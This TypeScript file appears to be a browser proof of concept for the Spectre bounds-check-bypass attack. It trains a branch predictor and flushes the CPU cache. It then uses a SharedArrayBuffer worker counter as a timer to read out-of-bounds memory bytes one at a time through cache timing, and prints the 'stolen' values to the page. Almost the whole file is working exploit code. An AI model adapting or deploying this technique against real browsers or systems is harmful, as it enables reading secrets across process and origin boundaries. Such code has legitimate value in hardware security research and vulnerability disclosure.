const CACHE_HIT_THRESHOLD = 2;
const TARGET_CACHE_SIZE = 8 * 1024 * 1024;
const FLUSH_BUFFER_SIZE = TARGET_CACHE_SIZE << 6;
const WARM_UP_DELAY = 2000;
const TABLE1_SIZE = 256;
const TABLE2_STRIDE = 4096;
const TABLE2_BYTES = 0x2000000;

let buffer1 = new ArrayBuffer(Int8Array.BYTES_PER_ELEMENT * TABLE1_SIZE);
let view1 = new Int8Array(buffer1);
for (let i = 0; i < TABLE1_SIZE; ++i) {
  view1[i] = i;
}
let probBuffer = new ArrayBuffer(TABLE2_BYTES);
let probView = new Int8Array(probBuffer);
let localJunk: number = 0;

function callGadget(index: number): void {
  if (index < view1.length) {
    index = view1[index | 0];
    index = ((index * TABLE2_STRIDE) | 0) & (TABLE2_BYTES - 1) | 0;
    localJunk ^= probView[index | 0] | 0;
  }
}

let flushBuffer = new ArrayBuffer(FLUSH_BUFFER_SIZE);
let flushBufferView = new Int8Array(flushBuffer);
let flushJunk: number = 0;
function flushCache(): void {
  const blockCount = (FLUSH_BUFFER_SIZE >> 12 - 1);
  for (let i = 0; i <= blockCount; ++i) {
    let toRead1 = ((i * 271) + 284) & blockCount;
    let toRead2 = ((i * 271) + 19) & blockCount;
    flushJunk ^= flushBufferView[toRead1 << 12];
    flushJunk ^= flushBufferView[toRead2 << 12];
  }
}

let counterWorker = new Worker('build/counter.js');
let sharedCounter: Int32Array;
counterWorker.onmessage = e => {
  if ((e.data instanceof Int32Array) && e.data.length == 1) {
    sharedCounter = e.data;

    let stealNextByte = (i: number) => {
      if (i < 256) {
        setTimeout(() => {
          reportByte(stealByte(i));
          stealNextByte(i + 1);
        }, 0);
      }
    };

    setTimeout(() => {
      reportMessage('Stealing some bytes...');
      stealNextByte(-10);
    }, WARM_UP_DELAY);

  } else {
    console.error('Unexpected input from worker thread');
  }
};

interface StolenByte {
  value1: number;
  value2: number;
  score1: number;
  score2: number;
}

let hitBuffer = new ArrayBuffer(Int32Array.BYTES_PER_ELEMENT * 256);
let hits = new Int32Array(hitBuffer);
let stealJunk = 0;
function stealByte(targetOffset: number): StolenByte {
  for (let i = 0; i < 256; ++i) {
    hits[i] = 0;
  }

  let x = 0;
  let training_x = 0;
  let top1 = -1;
  let top2 = -1;
  for (let tries = 99; tries >= 0; --tries) {
    training_x = tries % view1.length;

    for (let j = 29; j >= 0; --j) {
      flushCache();  // I couldn't find a better way to flush view1.length
      stealJunk ^= Atomics.load(sharedCounter, 0);

      x = ((j % 6) - 1) & ~0xFFFF;
      x = (x | (x >> 16));
      x = training_x ^ (x & (targetOffset ^ training_x));

      callGadget(x);
    }

    const pview = probView;
    for (let i = 0; i < 256; ++i) {
      let mix_i = ((i * 167) + 13) & 255;
      let probIndex = mix_i << 12;
      let time1 = Atomics.load(sharedCounter, 0);
      stealJunk ^= pview[probIndex];
      let time2 = Atomics.load(sharedCounter, 0) - time1;
      if (time2  <= CACHE_HIT_THRESHOLD && mix_i != view1[training_x]) {
        ++hits[mix_i];
      }
    }

    top1 = -1;
    top2 = -1;
    for (let i = 0; i < 256; i++) {
      if (top1 < 0 || hits[i] > hits[top1]) {
        top2 = top1;
        top1 = i;
      } else if (top2 < 0 || hits[i] > hits[top2]) {
        top2 = i;
      }
    }
    if (hits[top1] >= 2 * hits[top2] + 5 || hits[top1] == 2 && hits[top2] == 0) {
      break;
    }
  }
  return {
    score1: hits[top1],
    score2: hits[top2],
    value1: top1,
    value2: top2
  };
}

function reportByte(byte: StolenByte): void {
  let message = `value1: ${byte.value1}, score1: ${byte.score1}, value2: ${byte.value2}, score2: ${byte.score2}`;
  reportMessage(message);
}

function reportMessage(message: string): void {
  let container = document.getElementById('main');
  container.appendChild(document.createTextNode('\n' + message));
}
